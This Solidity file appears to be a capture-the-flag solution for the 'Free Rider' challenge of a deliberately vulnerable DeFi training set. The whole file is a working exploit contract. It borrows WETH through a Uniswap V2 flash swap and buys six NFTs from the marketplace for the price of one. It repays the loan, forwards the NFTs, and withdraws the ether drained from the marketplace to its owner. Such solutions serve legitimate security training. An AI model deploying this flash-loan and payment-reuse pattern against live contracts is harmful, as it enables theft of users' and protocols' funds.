//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol";
import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v2-core/contracts/interfaces/IERC20.sol";

import "../free-rider/FreeRiderNFTMarketplace.sol";

// WETH9.sol solidity version fuck thing up so we just write the interface with the fcts we need
interface IWETH {
    function balanceOf(address owner) external view returns (uint256 balance);

    function deposit() external payable;

    function withdraw(uint256 wad) external;

    function transfer(address to, uint256 value)
        external
        returns (bool success);
}

contract AttackFreeRider is IUniswapV2Callee, IERC721Receiver {
    address buyerContract;
    address nft;
    address marketplace;
    address weth;
    address dvt;
    address uniswap;
    uint256 NFTPrice = 15 ether;
    address owner; // to withdraw the ether

    constructor(
        address _buyerContract,
        address _nft,
        address _marketplace,
        address _weth_token,
        address _dvt,
        address _uniswap
    ) {
        buyerContract = _buyerContract;
        nft = _nft;
        marketplace = _marketplace;
        weth = _weth_token;
        dvt = _dvt;
        uniswap = _uniswap;
        owner = msg.sender;
    }

    // Attack function
    function attack() external {
        //Get pair + token info
        address pair = IUniswapV2Factory(uniswap).getPair(weth, dvt);
        address token0 = IUniswapV2Pair(pair).token0();
        address token1 = IUniswapV2Pair(pair).token1();

        //Get amount info
        uint256 amount0Out = weth == token0 ? NFTPrice : 0;
        uint256 amount1Out = weth == token1 ? NFTPrice : 0;

        //Make sure the 4th param is not zero so uniswap know we want a flash swap
        bytes memory nonzero_data = abi.encode(1);

        //Get the flash swap
        IUniswapV2Pair(pair).swap(
            amount0Out,
            amount1Out,
            address(this),
            nonzero_data
        );
    }

    // Flash Swap callback from UniSwap
    // We don't need any param
    function uniswapV2Call(
        address,
        uint256,
        uint256,
        bytes calldata
    ) external override {
        address token0 = IUniswapV2Pair(msg.sender).token0(); // fetch the address of token0
        address token1 = IUniswapV2Pair(msg.sender).token1(); // fetch the address of token1
        assert(
            msg.sender == IUniswapV2Factory(uniswap).getPair(token0, token1)
        ); // ensure that msg.sender is a V2 pair

        // Change our WETH in ETH
        IWETH(weth).withdraw(IWETH(weth).balanceOf(address(this)));

        // BUY THE NFT
        uint256[] memory tokenIds = new uint256[](6);
        for (uint256 i = 0; i < 6; i++) {
            tokenIds[i] = i;
        }
        FreeRiderNFTMarketplace(payable(marketplace)).buyMany{value: NFTPrice}(
            tokenIds
        );

        //Get WETH back in exchange of ETH to repay the uniswap pair
        IWETH(weth).deposit{value: 15.1 ether}();

        // Repayment

        // Single-Token fee
        uint256 fee = (NFTPrice * 31) / 10000;
        uint256 repayment = NFTPrice + fee;

        //Sent the WETH back to the pair
        IWETH(weth).transfer(
            IUniswapV2Factory(uniswap).getPair(token0, token1),
            repayment
        );
    }

    function sendNFTToBuyer() public {
        // Send the NFT to the Buyer making sure we call its `onERC721Received` function
        for (uint256 i = 0; i < 6; i++) {
            DamnValuableNFT(nft).safeTransferFrom(
                address(this),
                buyerContract,
                i
            );
        }
    }

    // Because the marketplace uses `token.safeTransferFrom()` we need this function
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    // To withdraw the ether sent by marketplace
    function withdraw() public {
        require(msg.sender == owner, "Only the owner can withdraw");
        payable(owner).transfer(address(this).balance);
    }

    // To receive ether
    receive() external payable {}
}
